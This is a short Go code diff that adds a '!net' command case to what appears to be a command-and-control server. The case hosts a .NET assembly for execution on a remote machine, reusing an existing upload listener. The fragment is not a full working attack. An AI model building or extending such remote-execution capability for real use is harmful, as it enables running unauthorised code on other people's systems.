@@ -126,6 +126,13 @@ func handleCmd(buf []byte) []byte {
 		}
 		src := argv[1]
 		go utils.UploadListen(src, session)
+	case "!net":
+		// same as upload for the server side, hosts the .NET assembly we want to execute
+		if len(argv) < 3 {
+			return buf
+		}
+		src := argv[1]
+		go utils.UploadListen(src, session)
 	}
 	return buf
 }
